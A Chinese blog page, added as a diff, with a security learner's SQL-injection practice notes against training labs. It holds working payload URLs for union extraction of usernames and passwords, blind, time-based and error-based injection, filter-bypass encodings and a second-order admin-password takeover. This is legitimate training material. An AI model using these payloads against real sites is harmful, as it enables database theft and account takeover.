@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>复习sql注入 | lanceplm</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+ 
+  
+    <link rel="icon" href="/../img/icon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle"></a>
+        
+          <a class="main-nav-link" href="/">首页</a>
+        
+          <a class="main-nav-link" href="/archives">归档</a>
+        
+          <a class="main-nav-link" href="/about">关于</a>
+        
+          <a class="main-nav-link" href="/board">留言</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-15.1-复习sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="name">
+      复习sql注入
+    </h1>
+  
+
+        <div class="article-meta">
+          <a href="/2024/01/14/15.1-%E5%A4%8D%E4%B9%A0sql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2024-01-14T08:32:50.132Z" itemprop="datePublished">2024-01-14</time>
+</a>
+          
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Burp-盲注"><a href="#Burp-盲注" class="headerlink" title="Burp_盲注"></a>Burp_盲注</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.33.131/sqli/Less-8/?id=1%27and%20ascii(substring(database(),1,1))=115--+</span><br></pre></td></tr></table></figure>
+
+<p>抓包</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114214148106.png" alt="image-20240114214148106"></p>
+<p>发到Intruder</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114214303720.png" alt="image-20240114214303720"></p>
+<p>集束炸弹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /sqli/Less-8/?id=1%27and%20ascii(substring(database(),§1§,1))=§115§--+ HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>选择爆破位置</p>
+<p>Payload1设置</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114214411375.png" alt="image-20240114214411375"></p>
+<p>Payload2设置</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114214954985.png" alt="image-20240114214954985"></p>
+<p>攻击得到：</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114214917853.png" alt="image-20240114214917853"></p>
+<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114212605442.png" alt="image-20240114212605442"></p>
+<h3 id="01数字型"><a href="#01数字型" class="headerlink" title="01数字型"></a>01数字型</h3><p>确定闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/01.php?id=1--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114163535947.png" alt="image-20240114163535947"></p>
+<p>确定位数</p>
+<p>3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/01.php?id=1 order by 4--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114163615823.png" alt="image-20240114163615823"></p>
+<p>显示回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101.43.235.147/sqli/01.php?id=-1 union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114163758155.png" alt="image-20240114163758155"></p>
+<p>爆用户，爆数据库，爆版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/01.php?id=-1 union select user(),database(),version()--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114163922534.png" alt="image-20240114163922534"></p>
+<p>爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/01.php?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;iwebsec&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114164113040.png" alt="image-20240114164113040"></p>
+<p>爆字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101.43.235.147/sqli/01.php?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114164723431.png" alt="image-20240114164723431"></p>
+<p>爆数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/01.php?id=-1 union select 1,2,group_concat(id,username,password) from user--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114164736531.png" alt="image-20240114164736531"></p>
+<h3 id="02字符型"><a href="#02字符型" class="headerlink" title="02字符型"></a>02字符型</h3><p>确定闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/02.php?id=1%27--+</span><br></pre></td></tr></table></figure>
+
+<p>其他与01相似</p>
+<p>爆数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/02.php?id=-1&#x27;%20union%20select%201,2,group_concat(id,username,password)%20from%20user--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114165012839.png" alt="image-20240114165012839"></p>
+<h3 id="03bool"><a href="#03bool" class="headerlink" title="03bool"></a>03bool</h3><p>确定闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/03.php?id=1--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114165258850.png" alt="image-20240114165258850"></p>
+<p>无回显</p>
+<p>bool盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/03.php?id=1%20and%20length((select%20database()))=7--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114165526855.png" alt="image-20240114165526855"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/03.php?id=1%20and%20length((select%20database()))%3E9--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114165541476.png" alt="image-20240114165541476"></p>
+<p>python脚本</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114165726579.png" alt="image-20240114165726579"></p>
+<h3 id="04sleep"><a href="#04sleep" class="headerlink" title="04sleep"></a>04sleep</h3><p>确定闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/04.php?id=1%27%20and%20if(1=1,sleep(10),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>时间盲注</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114171907301.png" alt="image-20240114171907301"></p>
+<p>脚本爆</p>
+<h3 id="05updatexml"><a href="#05updatexml" class="headerlink" title="05updatexml"></a>05updatexml</h3><p>类型和1一样</p>
+<p>尝试报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/05.php?id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114172831184.png" alt="image-20240114172831184"></p>
+<h3 id="06宽字节"><a href="#06宽字节" class="headerlink" title="06宽字节"></a>06宽字节</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/06.php?id=-1%df%27%20union%20select%201,database(),3--%20-</span><br><span class="line"></span><br><span class="line">http://101.43.235.147/sqli/06.php?id=-1%df&#x27; union select 1,database(),3-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114190933368.png" alt="image-20240114190933368"></p>
+<h3 id="07空格过滤"><a href="#07空格过滤" class="headerlink" title="07空格过滤"></a>07空格过滤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/07.php?id=-1%0aunion%0aselect%0a1,database(),3--%0a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114194520528.png" alt="image-20240114194520528"></p>
+<p>需要空格的部分就直接用%0a代替，最后不能用–+的原因应该是+代表一个空格</p>
+<h3 id="08大小写过滤"><a href="#08大小写过滤" class="headerlink" title="08大小写过滤"></a>08大小写过滤</h3><p>找闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/08.php?id=1--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114194758959.png" alt="image-20240114194758959"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/08.php?id=-1 UniOn sElEct 1,dAtaBase(),3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114194918432.png" alt="image-20240114194918432"></p>
+<h3 id="09双写关键字绕过"><a href="#09双写关键字绕过" class="headerlink" title="09双写关键字绕过"></a>09双写关键字绕过</h3><p>找闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/09.php?id=1--+</span><br></pre></td></tr></table></figure>
+
+<p>尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/09.php?id=-1 union select database()--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114195338024.png" alt="image-20240114195338024"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use near &#x27;database()-- LIMIT 0,1&#x27; at line 1 </span><br></pre></td></tr></table></figure>
+
+<p>发现union select 不见了</p>
+<p>双写代替</p>
+<p>测试发现union没被过滤，select被过滤了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/09.php?id=-1 union selselectect 1,database(),3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114195932255.png" alt="image-20240114195932255"></p>
+<p>用<strong>selselectect</strong>代替<strong>select</strong>即可</p>
+<p>尝试查数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/09.php?id=-1 union selselectect 1,2,group_concat(id,username,password) from user--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114200055756.png" alt="image-20240114200055756"></p>
+<p>应该是只过滤了一次select</p>
+<h3 id="10双重url编码绕过"><a href="#10双重url编码绕过" class="headerlink" title="10双重url编码绕过"></a>10双重url编码绕过</h3><p>不管咋试都报错</p>
+<p>百度</p>
+<p>双重编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/10.php?id=-1 union select 1,2,database()-- -</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/10.php?id=-1%2520%2575%256e%2569%256f%256e%2520%2573%2565%256c%2565%2563%2574%2520%2531%252c%2532%252c%2564%2561%2574%2561%2562%2561%2573%2565%2528%2529%252d%252d%2520%252d</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114202039923.png" alt="image-20240114202039923"></p>
+<h3 id="11十六进制编码绕过"><a href="#11十六进制编码绕过" class="headerlink" title="11十六进制编码绕过"></a>11十六进制编码绕过</h3><p>找闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/11.php?id=1--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/11.php?id=-1 union select user(),database(),version()--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114204334076.png" alt="image-20240114204334076"></p>
+<p>与1类似但是说了编码绕过可以有问题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/01.php?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;iwebsec&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114204446889.png" alt="image-20240114204446889"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &#x27;\&#x27;iwebsec\&#x27;-- LIMIT 0,1&#x27; at line 1 </span><br></pre></td></tr></table></figure>
+
+<p>出现iwebsec就注释，那就跟着题目走</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/11.php?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+	</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114205011875.png" alt="image-20240114205011875"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101.43.235.147/sqli/11.php?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114205056504.png" alt="image-20240114205056504"></p>
+<p>user又被\注释了</p>
+<p>16进制编码user</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101.43.235.147/sqli/11.php?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=75736572--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114205225264.png" alt="image-20240114205225264"></p>
+<p>这次没有回显了</p>
+<p>百度</p>
+<p>需要在编码前加上0x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101.43.235.147/sqli/11.php?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x75736572--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114205445825.png" alt="image-20240114205445825"></p>
+<h3 id="12等价函数替换过滤"><a href="#12等价函数替换过滤" class="headerlink" title="12等价函数替换过滤"></a>12等价函数替换过滤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/12.php?id=1 union select 1,2,database()--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114210122003.png" alt="image-20240114210122003"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.43.235.147/sqli/12.php?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema like &#x27;iwebsec&#x27;--+	</span><br></pre></td></tr></table></figure>
+
+<p>用like代替&#x3D;</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114210923750.png" alt="image-20240114210923750"></p>
+<h3 id="13MySQL二次注入"><a href="#13MySQL二次注入" class="headerlink" title="13MySQL二次注入"></a>13MySQL二次注入</h3><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114211641394.png" alt="image-20240114211641394"></p>
+<p>注册页面</p>
+<p>通过邮箱找回密码</p>
+<p>爆admin的密码</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114211751526.png" alt="image-20240114211751526"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin#</span><br><span class="line">1111</span><br><span class="line">11111</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114211814155.png" alt="image-20240114211814155"></p>
+<p>点击通过邮箱找回密码</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114211843678.png" alt="image-20240114211843678"></p>
+<p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11111</span><br></pre></td></tr></table></figure>
+
+<p>爆出admin密码</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240114211919435.png" alt="image-20240114211919435"></p>
+
+      
+    </div>
+  </div>
+ 
+</article>
+
+
+  
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div id="vcomment" class="comment"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+    var notify = 'true' == true ? true : false;
+    var verify = 'false' == true ? true : false;
+    new Valine({
+        av: AV,
+        el: '#vcomment',
+        notify: notify,
+        app_id: "HBismw2vU6hg56PslAF2APW1-gzGzoHsz",
+        app_key: "k41e2BJYdNbojyHuMnKT5LBK",
+        placeholder: "留下你来过的痕迹~",
+        avatar:"robohash",
+    });
+</script>
+
+  </section>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+    <div class="widget-wrap-info">
+        <img src="/../img/avator.jpg" class="widget-wrap-info-img">
+        <div class="widget-wrap-info-author">lanceplm</div>
+        <div class="widget-wrap-info-signature">随遇而安。</div>
+    </div>
+    <div class="info-nav">
+        <ul class="info-nav-ul">
+        
+            <li class="info-nav-li">
+            <a class="info-nav-link" href="/">
+                <div class="info-nav-div">
+                    <span class="info-nav-icon">
+                        <i data-feather="home"></i>
+                    </span>
+                    <span class="info-nav-name">首页</span>
+                </div>
+            </a>
+           </li>
+          
+            <li class="info-nav-li">
+            <a class="info-nav-link" href="/archives">
+                <div class="info-nav-div">
+                    <span class="info-nav-icon">
+                        <i data-feather="archive"></i>
+                    </span>
+                    <span class="info-nav-name">归档</span>
+                </div>
+            </a>
+           </li>
+          
+            <li class="info-nav-li">
+            <a class="info-nav-link" href="/about">
+                <div class="info-nav-div">
+                    <span class="info-nav-icon">
+                        <i data-feather="alert-circle"></i>
+                    </span>
+                    <span class="info-nav-name">关于</span>
+                </div>
+            </a>
+           </li>
+          
+            <li class="info-nav-li">
+            <a class="info-nav-link" href="/board">
+                <div class="info-nav-div">
+                    <span class="info-nav-icon">
+                        <i data-feather="edit-3"></i>
+                    </span>
+                    <span class="info-nav-name">留言</span>
+                </div>
+            </a>
+           </li>
+          
+        </ul>
+    </div>
+</div>
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2024 lanceplm<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | Theme by  <a href="https://github.com/FuShaoLei/hexo-theme-hiya" target="_blank">Hiya</a>
+      
+        <br>
+        <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+      <span id="busuanzi_container_site_uv">
+        访客数<span id="busuanzi_value_site_uv"></span>人次
+      </span>
+        
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/,home" class="mobile-nav-link">首页</a>
+  
+    <a href="/archives,archive" class="mobile-nav-link">归档</a>
+  
+    <a href="/about,alert-circle" class="mobile-nav-link">关于</a>
+  
+    <a href="/board,edit-3" class="mobile-nav-link">留言</a>
+  
+</nav>
+    <script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script>
+    feather.replace()
+</script>
+
+<script src="/js/script.js"></script>
+
+
+  </div>
+</body>
+</html>
